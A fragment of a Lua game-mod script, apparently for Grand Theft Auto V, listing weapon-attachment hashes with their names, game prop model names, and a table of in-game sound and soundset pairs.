    ["0xC304849A"] = "Suppressor", --Suppressor
    ["0xC6654D72"] = "Yusuf Amir Luxury Finish", --Yusuf Amir Luxury Finish
    ["0x31C4B22A"] = "Default Clip", --Default Clip
    ["0x249A17D5"] = "Extended Clip", --Extended Clip
    ["0x9B76C72C"] = "Gilded Gun Metal Finish", --Gilded Gun Metal Finish
    ["0x2297BE19"] = "Default Clip", --Default Clip
    ["0xD9D3AC92"] = "Extended Clip", --Extended Clip
    ["0xA73D4664"] = "Suppressor", --Suppressor
    ["0x77B8AB2F"] = "Platinum Pearl Deluxe Finish", --Platinum Pearl Deluxe Finish
    ["0x16EE3040"] = "VIP Variant", --VIP Variant
    ["0x9493B80D"] = "Bodyguard Variant", --Bodyguard Variant
    ["0xE9867CE3"] = "Default Clip", --Default Clip
    ["0xF8802ED9"] = "Default Clip", --Default Clip
    ["0x7B0033B3"] = "Extended Clip", --Extended Clip
    ["0x8033ECAF"] = "Etched Wood Grip Finish", --Etched Wood Grip Finish
    ["0xD4A969A"] = "Default Clip", --Default Clip
    ["0x64F9C62B"] = "Extended Clip", --Extended Clip
    ["0x7A6A7B7B"] = "Etched Wood Grip Finish", --Etched Wood Grip Finish
    ["0xBA23D8BE"] = "Default Rounds", --Default Rounds
    ["0xC6D8E476"] = "Tracer Rounds", --Tracer Rounds
    ["0xEFBF25"] = "Incendiary Rounds", --Incendiary Rounds
    ["0x10F42E8F"] = "Hollow Point Rounds", --Hollow Point Rounds
    ["0xDC8BA3F"] = "Full Metal Jacket Rounds", --Full Metal Jacket Rounds
    ["0x420FD713"] = "Holographic Sight", --Holographic Sight
    ["0x49B2945"] = "Small Scope", --Small Scope
    ["0x27077CCB"] = "Compensator", --Compensator
    ["0xC03FED9F"] = "Digital Camo", --Digital Camo
    ["0xB5DE24"] = "Brushstroke Camo", --Brushstroke Camo
    ["0xA7FF1B8"] = "Woodland Camo", --Woodland Camo
    ["0xF2E24289"] = "Skull", --Skull
    ["0x11317F27"] = "Sessanta Nove", --Sessanta Nove
    ["0x17C30C42"] = "Perseus", --Perseus
    ["0x257927AE"] = "Leopard", --Leopard
    ["0x37304B1C"] = "Zebra", --Zebra
    ["0x48DAEE71"] = "Geometric", --Geometric
    ["0x20ED9B5B"] = "Boom!", --Boom!
    ["0xD951E867"] = "Patriotic", --Patriotic
    ["0x1466CE6"] = "Default Clip", --Default Clip
    ["0xCE8C0772"] = "Extended Clip", --Extended Clip
    ["0x902DA26E"] = "Tracer Rounds", --Tracer Rounds
    ["0xE6AD5F79"] = "Incendiary Rounds", --Incendiary Rounds
    ["0x8D107402"] = "Hollow Point Rounds", --Hollow Point Rounds
    ["0xC111EB26"] = "Full Metal Jacket Rounds", --Full Metal Jacket Rounds
    ["0x4A4965F3"] = "Flashlight", --Flashlight
    ["0x47DE9258"] = "Mounted Scope", --Mounted Scope
    ["0xAA8283BF"] = "Compensator", --Compensator
    ["0xF7BEEDD"] = "Digital Camo", --Digital Camo
    ["0x8A612EF6"] = "Brushstroke Camo", --Brushstroke Camo
    ["0x76FA8829"] = "Woodland Camo", --Woodland Camo
    ["0xA93C6CAC"] = "Skull", --Skull
    ["0x9C905354"] = "Sessanta Nove", --Sessanta Nove
    ["0x4DFA3621"] = "Perseus", --Perseus
    ["0x42E91FFF"] = "Leopard", --Leopard
    ["0x54A8437D"] = "Zebra", --Zebra
    ["0x68C2746"] = "Geometric", --Geometric
    ["0x2366E467"] = "Boom!", --Boom!
    ["0x441882E6"] = "Boom!", --Boom!
    ["0xE7EE68EA"] = "Digital Camo", --Digital Camo
    ["0x29366D21"] = "Brushstroke Camo", --Brushstroke Camo
    ["0x3ADE514B"] = "Woodland Camo", --Woodland Camo
    ["0xE64513E9"] = "Skull", --Skull
    ["0xCD7AEB9A"] = "Sessanta Nove", --Sessanta Nove
    ["0xFA7B27A6"] = "Perseus", --Perseus
    ["0xE285CA9A"] = "Leopard", --Leopard
    ["0x2B904B19"] = "Zebra", --Zebra
    ["0x22C24F9C"] = "Geometric", --Geometric
    ["0x8D0D5ECD"] = "Boom!", --Boom!
    ["0x1F07150A"] = "Patriotic", --Patriotic
    ["0x94F42D62"] = "Default Clip", --Default Clip
    ["0x5ED6C128"] = "Extended Clip", --Extended Clip
    ["0x25CAAEAF"] = "Tracer Rounds", --Tracer Rounds
    ["0x2BBD7A3A"] = "Incendiary Rounds", --Incendiary Rounds
    ["0x85FEA109"] = "Hollow Point Rounds", --Hollow Point Rounds
    ["0x4F37DF2A"] = "Full Metal Jacket Rounds", --Full Metal Jacket Rounds
    ["0x8ED4BB70"] = "Mounted Scope", --Mounted Scope
    ["0x43FD595B"] = "Flashlight", --Flashlight
    ["0x21E34793"] = "Compensator", --Compensator
    ["0x5C6C749C"] = "Digital Camo", --Digital Camo
    ["0x15F7A390"] = "Brushstroke Camo", --Brushstroke Camo
    ["0x968E24DB"] = "Woodland Camo", --Woodland Camo
    ["0x17BFA99"] = "Skull", --Skull
    ["0xF2685C72"] = "Sessanta Nove", --Sessanta Nove
    ["0xDD2231E6"] = "0xDD2231E6", --Perseus
    ["0xBB43EE76"] = "Leopard", --Leopard
    ["0x4D901310"] = "Zebra", --Zebra
    ["0x5F31B653"] = "Geometric", --Geometric
    ["0x697E19A0"] = "Boom!", --Boom!
    ["0x930CB951"] = "Patriotic", --Patriotic
    ["0xB4FC92B0"] = "Digital Camo", --Digital Camo
    ["0x1A1F1260"] = "Digital Camo", --Digital Camo
    ["0xE4E00B70"] = "Digital Camo",
    ["0x2C298B2B"] = "Digital Camo",
    ["0xDFB79725"] = "Digital Camo",
    ["0x6BD7228C"] = "Digital Camo",
    ["0x9DDBCF8C"] = "Digital Camo",
    ["0xB319A52C"] = "Digital Camo",
    ["0xC6836E12"] = "Digital Camo",
    ["0x43B1B173"] = "Digital Camo",
    ["0x4ABDA3FA"] = "Patriotic", --Patriotic
    ["0x45A3B6BB"] = "Default Clip", --Default Clip
    ["0x33BA12E8"] = "Extended Clip", --Extended Clip
    ["0xD7DBF707"] = "Festive tint", --Festive tint
    ["0x54D41361"] = "Default Clip", --Default Clip
    ["0x81786CA9"] = "Extended Clip", --Extended Clip
    ["0x9307D6FA"] = "Suppressor", --Suppressor
    ----------------SUBMACHINE-GUNS------------------------
    ["0xCB48AEF0"] = "Default Clip",
    ["0x10E6BA2B"] = "Extended Clip",
    ["0x359B7AAE"] = "Flashlight",
    ["0x9D2FBF29"] = "Scope",
    ["0x487AAE09"] = "Yusuf Amir Luxury Finish",
    ["0x26574997"] = "Default Clip",
    ["0x350966FB"] = "Extended Clip",
    ["0x79C77076"] = "Drum Magazine",
    ["0x7BC4CDDC"] = "Flashlight",
    ["0x3CC6BA57"] = "Scope",
    ["0x27872C90"] = "Yusuf Amir Luxury Finish",
    ["0x8D1307B0"] = "Default Clip",
    ["0xBB46E417"] = "Extended Clip",
    ["0x278C78AF"] = "Yusuf Amir Luxury Finish",
    ["0x84C8B2D3"] = "Default Clip",
    ["0x937ED0B7"] = "Extended Clip",
    ["0x4C24806E"] = "Default Clip",
    ["0xB9835B2E"] = "Extended Clip",
    ["0x7FEA36EC"] = "Tracer Rounds",
    ["0xD99222E5"] = "Incendiary Rounds",
    ["0x3A1BD6FA"] = "Hollow Point Rounds",
    ["0xB5A715F"] = "Full Metal Jacket Rounds",
    ["0x9FDB5652"] = "Holographic Sight",
    ["0xE502AB6B"] = "Small Scope",
    ["0x3DECC7DA"] = "Medium Scope",
    ["0xB99402D4"] = "Flat Muzzle Brake",
    ["0xC867A07B"] = "Tactical Muzzle Brake",
    ["0xDE11CBCF"] = "Fat-End Muzzle Brake",
    ["0xEC9068CC"] = "Precision Muzzle Brake",
    ["0x2E7957A"] = "Heavy Duty Muzzle Brake",
    ["0x347EF8AC"] = "Slanted Muzzle Brake",
    ["0x4DB62ABE"] = "Split-End Muzzle Brake",
    ["0xD9103EE1"] = "Default Barrel",
    ["0xA564D78B"] = "Heavy Barrel",
    ["0xC4979067"] = "Digital Camo",
    ["0x3815A945"] = "Brushstroke Camo",
    ["0x4B4B4FB0"] = "Woodland Camo",
    ["0xEC729200"] = "Skull",
    ["0x48F64B22"] = "Sessanta Nove",
    ["0x35992468"] = "Perseus",
    ["0x24B782A5"] = "Leopard",
    ["0xA2E67F01"] = "Zebra",
    ["0x2218FD68"] = "Geometric",
    ["0x45C5C3C5"] = "Boom!",
    ["0x399D558F"] = "Patriotic",
    ["0x476E85FF"] = "Default Clip",
    ["0xB92C6979"] = "Extended Clip",
    ["0xA9E9CAF4"] = "Drum Magazine",
    ["0x4317F19E"] = "Default Clip",
    ["0x334A5203"] = "Extended Clip",
    ["0x6EB8C8DB"] = "Drum Magazine",
    ["0xC164F53"] = "Grip",
    ["0xAA2C45B4"] = "Scope",
    ------------Shotguns-------------
    ["0xE608B35E"] = "Suppressor",
    ["0xA2D79DDB"] = "Yusuf Amir Luxury Finish",
    ["0x85A64DF9"] = "Gilded Gun Metal Finish",
    ["0x94E81BC7"] = "Default Clip",
    ["0x86BD7F72"] = "Extended Clip",
    ["0x837445AA"] = "Suppressor",
    ["0xCD940141"] = "Default Shells",
    ["0x9F8A1BF5"] = "Dragon's Breath Shells",
    ["0x4E65B425"] = "Steel Buckshot Shells",
    ["0xE9582927"] = "Flechette Shells",
    ["0x3BE4465D"] = "Explosive Slugs",
    ["0x3F3C8181"] = "Medium Scope",
    ["0xAC42DF71"] = "Suppressor",
    ["0x5F7DCE4D"] = "Squared Muzzle Brake	",
    ["0xE3BD9E44"] = "Digital Camo",
    ["0x17148F9B"] = "Brushstroke Camo",
    ["0x24D22B16"] = "Woodland Camo",
    ["0xF2BEC6F0"] = "Skull",
    ["0x85627D"] = "Sessanta Nove",
    ["0xDC2919C5"] = "Perseus",
    ["0xE184247B"] = "Leopard",
    ["0xD8EF9356"] = "Zebra",
    ["0xEF29BFCA"] = "Geometric",
    ["0x67AEB165"] = "Boom!",
    ["0x46411A1D"] = "Patriotic",
    ["0x324F2D5F"] = "Default Clip",
    ["0x971CF6FD"] = "Extended Clip",
    ["0x88C7DA53"] = "Drum Magazine",
    ---------Rifles-------------------------------
    ["0xBE5EEA16"] = "Default Clip",
    ["0xB1214F9B"] = "Extended Clip",
    ["0xDBF0A53D"] = "Drum Magazine",
    ["0x4EAD7533"] = "Yusuf Amir Luxury Finish",
    ["0x9FBE33EC"] = "Default Clip",
    ["0x91109691"] = "Extended Clip",
    ["0xBA62E935"] = "Box Magazine",
    ["0xA0D89C42"] = "Scope",
    ["0xD89B9658"] = "Yusuf Amir Luxury Finish",
    ["0xFA8FA10F"] = "Default Clip",
    ["0x8EC1C979"] = "Extended Clip",
    ["0x377CD377"] = "Gilded Gun Metal Finish",
    ["0xC6C7E581"] = "Default Clip",
    ["0x7C8BD10E"] = "Extended Clip",
    ["0x6B59AEAA"] = "Drum Magazine",
    ["0x730154F2"] = "Etched Gun Metal Finish",
    ["0xC5A12F80"] = "Default Clip",
    ["0xB3688B0F"] = "Extended Clip",
    ["0xA857BC78"] = "Gilded Gun Metal Finish",
    ["0x18929DA"] = "Default Clip",
    ["0xEFB00628"] = "Extended Clip",
    ["0x822060A9"] = "Tracer Rounds",
    ["0xA99CF95A"] = "Incendiary Rounds",
    ["0xFAA7F5ED"] = "Armor Piercing Rounds",
    ["0x43621710"] = "Full Metal Jacket Rounds",
    ["0xC7ADD105"] = "Small Scope",
    ["0x659AC11B"] = "Default Barrel",
    ["0x3BF26DC7"] = "Heavy Barrel",
    ["0x9D65907A"] = "Grip",
    ["0xAE4055B7"] = "Digital Camo",
    ["0xB905ED6B"] = "Brushstroke Camo",
    ["0xA6C448E8"] = "Woodland Camo",
    ["0x9486246C"] = "Skull",
    ["0x8A390FD2"] = "Sessanta Nove",
    ["0x2337FC5"] = "Perseus",
    ["0xEFFFDB5E"] = "Leopard",
    ["0xDDBDB6DA"] = "Zebra",
    ["0xCB631225"] = "Geometric",
    ["0xA87D541E"] = "Boom!",
    ["0xC5E9AE52"] = "Patriotic",
    ["0x16C69281"] = "Default Clip",
    ["0xDE1FA12C"] = "Extended Clip",
    ["0x8765C68A"] = "Tracer Rounds",
    ["0xDE011286"] = "Incendiary Rounds",
    ["0x51351635"] = "Armor Piercing Rounds",
    ["0x503DEA90"] = "Full Metal Jacket Rounds",
    ["0xC66B6542"] = "Large Scope",
    ["0xE73653A9"] = "Default Barrel",
    ["0xF97F783B"] = "Heavy Barrel",
    ["0xD40BB53B"] = "Digital Camo",
    ["0x431B238B"] = "Brushstroke Camo",
    ["0x34CF86F4"] = "Woodland Camo",
    ["0xB4C306DD"] = "Skull",
    ["0xEE677A25"] = "Sessanta Nove",
    ["0xDF90DC78"] = "Perseus",
    ["0xA4C31EE"] = "Leopard",
    ["0x89CFB0F7"] = "Zebra",
    ["0x7B82145C"] = "Geometric",
    ["0x899CAF75"] = "Boom!",
    ["0x5218C819"] = "Patriotic",
    ["0x8610343F"] = "Default Clip",
    ["0xD12ACA6F"] = "Extended Clip",
    ["0xEF2C78C1"] = "Tracer Rounds",
    ["0xFB70D853"] = "Incendiary Rounds",
    ["0xA7DD1E58"] = "Armor Piercing Rounds",
    ["0x63E0A098"] = "Full Metal Jacket Rounds",
    ["0x43A49D26"] = "Default Barrel",
    ["0x5646C26A"] = "Heavy Barrel",
    ["0x911B24AF"] = "Digital Camo",
    ["0x37E5444B"] = "Brushstroke Camo",
    ["0x538B7B97"] = "Woodland Camo",
    ["0x25789F72"] = "Skull",
    ["0xC5495F2D"] = "Sessanta Nove",
    ["0xCF8B73B1"] = "Perseus",
    ["0xA9BB2811"] = "Leopard",
    ["0xFC674D54"] = "Zebra",
    ["0x7C7FCD9B"] = "Geometric",
    ["0xA5C38392"] = "Boom!",
    ["0xB9B15DB0"] = "Patriotic",
    ["0x4C7A391E"] = "Default Clip",
    ["0x5DD5DBD5"] = "Extended Clip",
    ["0x1757F566"] = "Tracer Rounds",
    ["0x3D25C2A7"] = "Incendiary Rounds",
    ["0x255D5D57"] = "Armor Piercing Rounds",
    ["0x44032F11"] = "Full Metal Jacket Rounds",
    ["0x833637FF"] = "Default Barrel",
    ["0x8B3C480B"] = "Heavy Barrel",
    ["0x4BDD6F16"] = "Digital Camo",
    ["0x406A7908"] = "Brushstroke Camo",
    ["0x2F3856A4"] = "Woodland Camo",
    ["0xE50C424D"] = "Skull",
    ["0xD37D1F2F"] = "Sessanta Nove	",
    ["0x86268483"] = "Perseus",
    ["0xF420E076"] = "Leopard",
    ["0xAAE14DF8"] = "Zebra",
    ["0x9893A95D"] = "Geometric",
    ["0x6B13CD3E"] = "Boom!",
    ["0xDA55CD3F"] = "Patriotic",
    ["0x513F0A63"] = "Default Clip",
    ["0x59FF9BF8"] = "Extended Clip",
    ["0xC607740E"] = "Drum Magazine",
    ["0x2D46D83B"] = "Default Clip",
    ["0x684ACE42"] = "Extended Clip",
    ["0x6B82F395"] = "Iron Sights",
    -------------Machine-Guns-----------
    ["0xF434EF84"] = "Default Clip",
    ["0x82158B47"] = "Extended Clip",
    ["0x3C00AFED"] = "Scope",
    ["0xD6DABABE"] = "Yusuf Amir Luxury Finish",
    ["0xE1FFB34A"] = "Default Clip",
    ["0xD6C59CD6"] = "Extended Clip",
    ["0x92FECCDD"] = "Etched Gun Metal Finish",
    ["0x492B257C"] = "Default Clip",
    ["0x17DF42E9"] = "Extended Clip",
    ["0xF6649745"] = "Tracer Rounds",
    ["0xC326BDBA"] = "Incendiary Rounds",
    ["0x29882423"] = "Armor Piercing Rounds",
    ["0x57EF1CC8"] = "Full Metal Jacket Rounds",
    ["0xC34EF234"] = "Default Barrel",
    ["0xB5E2575B"] = "Heavy Barrel",
    ["0x4A768CB5"] = "Digital Camo",
    ["0xCCE06BBD"] = "Brushstroke Camo",
    ["0xBE94CF26"] = "Woodland Camo",
    ["0x7609BE11"] = "Skull",
    ["0x48AF6351"] = "Sessanta Nove",
    ["0x9186750A"] = "Perseus",
    ["0x84555AA8"] = "Leopard",
    ["0x1B4C088B"] = "Zebra",
    ["0xE046DFC"] = "Geometric",
    ["0x28B536E"] = "Boom!",
    ["0xD703C94D"] = "Patriotic",
    ["0x1CE5A6A5"] = "Default Clip",
    ["0xEAC8C270"] = "Extended Clip",
    --------------Sniper---------------
    ["0x9BC64089"] = "Default Clip",
    ["0xD2443DDC"] = "Scope",
    ["0xBC54DA77"] = "Advanced Scope",
    ["0x4032B5E7"] = "Etched Wood Grip Finish",
    ["0x476F52F4"] = "Default Clip",
    ["0x94E12DCE"] = "Default Clip",
    ["0xE6CFD1AA"] = "Extended Clip",
    ["0xD77A22D2"] = "Tracer Rounds",
    ["0x6DD7A86E"] = "Incendiary Rounds",
    ["0xF46FD079"] = "Armor Piercing Rounds",
    ["0xE14A9ED3"] = "Full Metal Jacket Rounds",
    ["0x5B1C713C"] = "Zoom Scope",
    ["0x381B5D89"] = "Default Barrel",
    ["0x68373DDC"] = "Heavy Barrel",
    ["0x9094FBA0"] = "Digital Camo",
    ["0x7320F4B2"] = "Brushstroke Camo",
    ["0x60CF500F"] = "Woodland Camo",
    ["0xFE668B3F"] = "Skull",
    ["0xF3757559"] = "Sessanta Nove",
    ["0x193B40E8"] = "Perseus",
    ["0x107D2F6C"] = "Leopard",
    ["0xC4E91841"] = "Zebra",
    ["0x9BB1C5D3"] = "Geometric",
    ["0x3B61040B"] = "Boom!",
    ["0xB7A316DA"] = "Boom!",
    ["0xFA1E1A28"] = "Default Clip",
    ["0x2CD8FF9D"] = "Extended Clip",
    ["0xEC0F617"] = "Incendiary Rounds",
    ["0xF835D6D4"] = "Armor Piercing Rounds",
    ["0x3BE948F6"] = "Full Metal Jacket Rounds",
    ["0x89EBDAA7"] = "Explosive Rounds",
    ["0x82C10383"] = "Zoom Scope",
    ["0xB68010B0"] = "Night Vision Scope",
    ["0x2E43DA41"] = "Thermal Scope",
    ["0x5F7DCE4D"] = "Squared Muzzle Brake",
    ["0x6927E1A1"] = "Bell-End Muzzle Brake",
    ["0x909630B7"] = "Default Barrel",
    ["0x108AB09E"] = "Heavy Barrel",
    ["0xF8337D02"] = "Digital Camo",
    ["0xC5BEDD65"] = "Brushstroke Camo",
    ["0xE9712475"] = "Woodland Camo",
    ["0x13AA78E7"] = "Skull",
    ["0x26591E50"] = "Sessanta Nove",
    ["0x302731EC"] = "Perseus",
    ["0xAC722A78"] = "Leopard",
    ["0xBEA4CEDD"] = "Zebra",
    ["0xCD776C82"] = "Geometric",
    ["0xABC5ACC7"] = "Boom!",
    ["0x6C32D2EB"] = "Patriotic",
    ["0xD83B4141"] = "Default Clip",
    ["0xCCFD2AC5"] = "Extended Clip",
    ["0x1C221B1A"] = "Scope",
    ["0x161E9241"] = "Yusuf Amir Luxury Finish",
    --------Heavy-Weapons---------
    ["0x11AE5C97"] = "Default Clip"
}

object_names = {

"Click Next Object >",
"Bricks",
"w_ex_pipebomb",
"Pizza's",
"prop_boombox_01",
"xm3_prop_xm3_boombox_01a",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
"10",
"11",
"12",
"13",
"14",
"15",
"16",
"17",
"18",
"19",
"20",
"21",
"22",
"23",
"24",
"25",
"26",
"27",
"28",
"29",
"Dandy's",
"Keypad's",
"Brittle Bush",
"Saplin",
"Fragment",
"Gas",
"Ball",
"Flagpole",
"Combat MG",
"Mag1",
"Barrel",
"40mm",
"Corp Rope",
"prop_amb_ciggy_01",
"prop_table_03_chr",
"prop_parasol_03",
"prop_traffic_01d",
"prop_streetlight_01",
"v_serv_bs_gelx3",
"prop_table_03",
"v_serv_bs_foam1",
"v_ret_ta_paproll2",
"v_serv_bs_razor",
"prop_tv_05",
"v_ret_gc_box2",
"prop_rub_stool",
"prop_speaker_05",
"v_serv_bs_shvbrush",
"v_serv_bs_shampoo",
"v_ret_ta_spray",
"v_serv_bs_cond",
"v_serv_bs_clutter",
"v_ilev_bs_door",
"prop_ld_purse_01",
"prop_amb_phone",
"prop_bin_10b",
"prop_amb_40oz_02",
"p_amb_coffeecup_01",
"prop_coffee_mac_02",
"prop_fire_exting_2a",
"prop_wall_light_06a",
"prop_xmas_ext",
"xm_prop_x17_osphatch_col",
"reh_prop_reh_sign_jk_01a",
"reh_prop_reh_bag_para_01a",
"tr_prop_tr_meet_coll_01",
"vw_prop_vw_garage_coll_01a",
"prop_forsale_dyn_01",
"xm_prop_base_cabinet_door_01",
"xm_prop_x17dlc_rep_sign_01a",
"gr_prop_gr_bunkeddoor_col",
"v_ret_ta_firstaid",
"prop_aircon_m_01",
"prop_wall_light_02a",
"v_ret_gc_calc",
"prop_micro_04",
"prop_gumball_02",
"prop_watercooler",
"prop_radio_01",
"prop_game_clock_01",
"prop_cctv_cam_06a",
"prop_till_01",
"prop_chair_02",
"prop_chair_04a",
"xs_prop_arena_flipper_large_01a",
"xs_prop_arena_flipper_small_01a",
"xs_prop_arena_flipper_xl_01a",
"xs_prop_arena_flipper_large_01a_sf",
"xs_prop_arena_flipper_small_01a_sf",
"xs_prop_arena_flipper_xl_01a_sf",
"xs_prop_arena_flipper_large_01a_wl",
"xs_prop_arena_flipper_small_01a_wl",
"xs_prop_arena_flipper_xl_01a_wl",
"xs_prop_trophy_flipper_01a"
}

--手机按键
SoundAnnoy = {
    { "All", "SHORT_PLAYER_SWITCH_SOUND_SET" },
    { "TENNIS_POINT_WON", "HUD_AWARDS" },
    {"Air_Defenses_Disabled", "DLC_sum20_Business_Battle_AC_Sounds"},
    {"Air_Defences_Activated", "DLC_sum20_Business_Battle_AC_Sounds"},
    {"TIME_LAPSE_MASTER", "0"},
    {"Fire", "DLC_BTL_Terrobyte_Turret_Sounds"},
    {"TIMER", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Timer_10s", "DLC_HALLOWEEN_FVJ_Sounds"},
    {"TIMER_STOP", "HUD_MINI_GAME_SOUNDSET"},
    {"5s_To_Event_Start_Countdown", "GTAO_FM_Events_Soundset"},
    {"10s", "MP_MISSION_COUNTDOWN_SOUNDSET"},
    {"5s", "MP_MISSION_COUNTDOWN_SOUNDSET"},
    {"5_Second_Timer", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET"},
    {"3_2_1_NON_RACE", "HUD_MINI_GAME_SOUNDSET"},
    {"3_2_1", "HUD_MINI_GAME_SOUNDSET"},
    {"Arming_Countdown", "GTAO_Speed_Convoy_Soundset"},
    {"Bomb_Disarmed", "GTAO_Speed_Convoy_Soundset"},
    {"Boss_Blipped", "GTAO_Magnate_Hunt_Boss_SoundSet"},
    {"Boss_Message_Orange", "GTAO_Boss_Goons_FM_Soundset"},
    {"1st_Person_Transition", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
    {"Apt_Style_Purchase", "DLC_APT_Apartment_SoundSet"},
    {"ARM_WRESTLING_WHOOSH_MASTER", "0"},
    {"ASSASSINATIONS_HOTEL_TIMER_COUNTDOWN", "ASSASSINATION_MULTI"},
    {"ATM_WINDOW", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"BASE_JUMP_PASSED", "HUD_AWARDS"},
    {"Bed", "WastedSounds"},
    {"Beep_Green", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Beep_Red", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Blade_Appear", "APT_BvS_Soundset"},
    {"BOATS_PLANES_HELIS_BOOM", "MP_LOBBY_SOUNDS"},
    {"Breaker_01", "DLC_HALLOWEEN_FVJ_Sounds"},
    {"Breaker_02", "DLC_HALLOWEEN_FVJ_Sounds"},
    {"Bus_Schedule_Pickup", "DLC_PRISON_BREAK_HEIST_SOUNDS"},
    {"CABLE_SNAPS", "CONSTRUCTION_ACCIDENT_1_SOUNDS"},
    {"CAM_PAN_DARTS", "HUD_MINI_GAME_SOUNDSET"},
    {"Camera_Shoot", "Phone_Soundset_Franklin"},
    {"CANCEL", "HUD_FREEMODE_SOUNDSET"},
    {"CAR_BIKE_WHOOSH", "MP_LOBBY_SOUNDS"},
    {"CHALLENGE_UNLOCKED", "HUD_AWARDS"},
    {"CHECKPOINT_AHEAD", "HUD_MINI_GAME_SOUNDSET"},
    {"CHECKPOINT_BEHIND", "HUD_MINI_GAME_SOUNDSET"},
    {"Checkpoint_Hit", "GTAO_FM_Events_Soundset"},
    {"CHECKPOINT_MISSED", "HUD_MINI_GAME_SOUNDSET"},
    {"CHECKPOINT_NORMAL", "HUD_MINI_GAME_SOUNDSET"},
    {"CHECKPOINT_PERFECT", "HUD_MINI_GAME_SOUNDSET"},
    {"Checkpoint_Teammate", "GTAO_Shepherd_Sounds"},
    {"CHECKPOINT_UNDER_THE_BRIDGE", "HUD_MINI_GAME_SOUNDSET"},
    {"Click", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE"},
    {"Click_Fail", "WEB_NAVIGATION_SOUNDS_PHONE"},
    {"Click_Special", "WEB_NAVIGATION_SOUNDS_PHONE"},
    {"CLOSED", "MP_PROPERTIES_ELEVATOR_DOORS"},
    {"CONFIRM_BEEP", "HUD_MINI_GAME_SOUNDSET"},
    {"CONTINUE", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Continue_Appears", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Crash", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Criminal_Damage_High_Value", "GTAO_FM_Events_Soundset"},
    {"Criminal_Damage_Kill_Player", "GTAO_FM_Events_Soundset"},
    {"Criminal_Damage_Low_Value", "GTAO_FM_Events_Soundset"},
    {"Cycle_Item", "DLC_Dmod_Prop_Editor_Sounds"},
    {"DELETE", "HUD_DEATHMATCH_SOUNDSET"},
    {"Delete_Placed_Prop", "DLC_Dmod_Prop_Editor_Sounds"},
    {"Deliver_Pick_Up", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"DiggerRevOneShot", "BulldozerDefault"},
    {"Door_Open", "DOCKS_HEIST_FINALE_2B_SOUNDS"},
    {"Drill_Pin_Break", "DLC_HEIST_FLEECA_SOUNDSET"},
    {"Dropped", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"EDIT", "HUD_DEATHMATCH_SOUNDSET"},
    {"Start_Squelch", "CB_RADIO_SFX"},
    {"End_Squelch", "CB_RADIO_SFX"},
    {"Enemy_Capture_Start", "GTAO_Magnate_Yacht_Attack_Soundset"},
    {"Enemy_Deliver", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"Enemy_Pick_Up", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"Enter_1st", "GTAO_FM_Events_Soundset"},
    {"Enter_Area", "DLC_Lowrider_Relay_Race_Sounds"},
    {"Enter_Capture_Zone", "DLC_Apartments_Drop_Zone_Sounds"},
    {"ERROR", "HUD_AMMO_SHOP_SOUNDSET"},
    {"Event_Message_Purple", "GTAO_FM_Events_Soundset"},
    {"Event_Start_Text", "GTAO_FM_Events_Soundset"},
    {"EXIT", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Exit_Capture_Zone", "DLC_Apartments_Drop_Zone_Sounds"},
    {"Failure", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Falling_Crates", "EXILE_1"},
    {"Faster_Bar_Full", "RESPAWN_ONLINE_SOUNDSET"},
    {"Faster_Click", "RESPAWN_ONLINE_SOUNDSET"},
    {"FestiveGift", "Feed_Message_Sounds"},
    {"FIRST_PLACE", "HUD_MINI_GAME_SOUNDSET"},
    {"FLIGHT_SCHOOL_LESSON_PASSED", "HUD_AWARDS"},
    {"FLYING_STREAM_END_INSTANT", "FAMILY_5_SOUNDS"},
    {"FocusIn", "HintCamSounds"},
    {"FocusOut", "HintCamSounds"},
    {"Friend_Deliver", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"Friend_Pick_Up", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"GO", "HUD_MINI_GAME_SOUNDSET"},
    {"Goal", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"GOLF_BIRDIE", "HUD_AWARDS"},
    {"GOLF_EAGLE", "HUD_AWARDS"},
    {"GOLF_HUD_HOLE_IN_ONE_MASTER", "0"},
    {"GOLF_HUD_SCORECARD_MASTER", "0"},
    {"GOLF_NEW_RECORD", "HUD_AWARDS"},
    {"Goon_Paid_Small", "GTAO_Boss_Goons_FM_Soundset"},
    {"Grab_Parachute", "BASEJUMPS_SOUNDS"},
    {"Hack_Failed", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"Hack_Success", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"HACKING_CLICK", "0"},
    {"HACKING_CLICK_BAD", "0"},
    {"HACKING_CLICK_GOOD", "0"},
    {"HACKING_MOVE_CURSOR", "0"},
    {"Hang_Up", "Phone_SoundSet_Michael"},
    {"HIGHLIGHT", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Highlight_Accept", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Highlight_Cancel", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Highlight_Error", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Highlight_Move", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"HIGHLIGHT_NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Hit", "RESPAWN_ONLINE_SOUNDSET"},
    {"Hit_1", "LONG_PLAYER_SWITCH_SOUNDS"},
    {"Hit_In", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
